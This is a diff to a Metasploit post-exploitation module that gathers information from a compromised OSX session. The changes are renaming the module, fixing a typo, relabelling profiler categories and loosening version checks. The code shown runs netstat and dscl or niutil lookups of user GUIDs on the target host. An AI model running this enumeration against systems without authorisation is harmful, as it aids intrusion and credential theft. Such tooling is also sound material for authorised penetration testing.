@@ -23,8 +23,8 @@ class Metasploit3 < Msf::Post
 
 	def initialize(info={})
 		super( update_info( info,
-				'Name'          => 'NAME',
-				'Description'   => %q{ Post Exploitaio module to do initial gathering of information out of an OSX Tiger, Leopard and Snow Leopard System},
+				'Name'          => 'OSX Enumertaion Module',
+				'Description'   => %q{ Post Exploitation module to do initial gathering of information out of an OSX Tiger, Leopard and Snow Leopard System},
 				'License'       => MSF_LICENSE,
 				'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
 				'Version'       => '$Revision$',
@@ -143,12 +143,12 @@ class Metasploit3 < Msf::Post
 			"USB" => "SPUSBDataType",
 			"Airport" => "SPAirPortDataType",
 			"Firewall" => "SPFirewallDataType",
-			"KnownNetworks" => "SPNetworkLocationDataType",
+			"Known Networks" => "SPNetworkLocationDataType",
 			"Applications" => "SPApplicationsDataType",
-			"DevelopmentTools" => "SPDeveloperToolsDataType",
+			"Development Tools" => "SPDeveloperToolsDataType",
 			"Frameworks" => "SPFrameworksDataType",
 			"Logs" => "SPLogsDataType",
-			"PreferencePanes" => "SPPrefPaneDataType",
+			"Preference Panes" => "SPPrefPaneDataType",
 			"StartUp" => "SPStartupItemDataType"}
 		shell_commands = {
 			"TCP Connections" => ["/usr/sbin/netstat","-np tcp"],
@@ -336,14 +336,14 @@ class Metasploit3 < Msf::Post
 
 		# Process each user
 		users.each do |user|
-			if ver_num =~ /10\.(6|5)\.\d/
+			if ver_num =~ /10\.(6|5)/
 				case session.type
 				when /meterpreter/
 					guid = cmd_exec("/usr/bin/dscl", "localhost -read /Search/Users/#{user} | grep GeneratedUID | cut -c15-").chomp
 				when /shell/
 					guid = session.shell_command_token("/usr/bin/dscl localhost -read /Search/Users/#{user} | grep GeneratedUID | cut -c15-").chomp
 				end
-			elsif ver_num =~ /10\.(4|3)\.\d/
+			elsif ver_num =~ /10\.(4|3)/
 				case session.type
 				when /meterpreter/
 					guid = cmd_exec("/usr/bin/niutil","-readprop . /users/#{user} generateduid").chomp
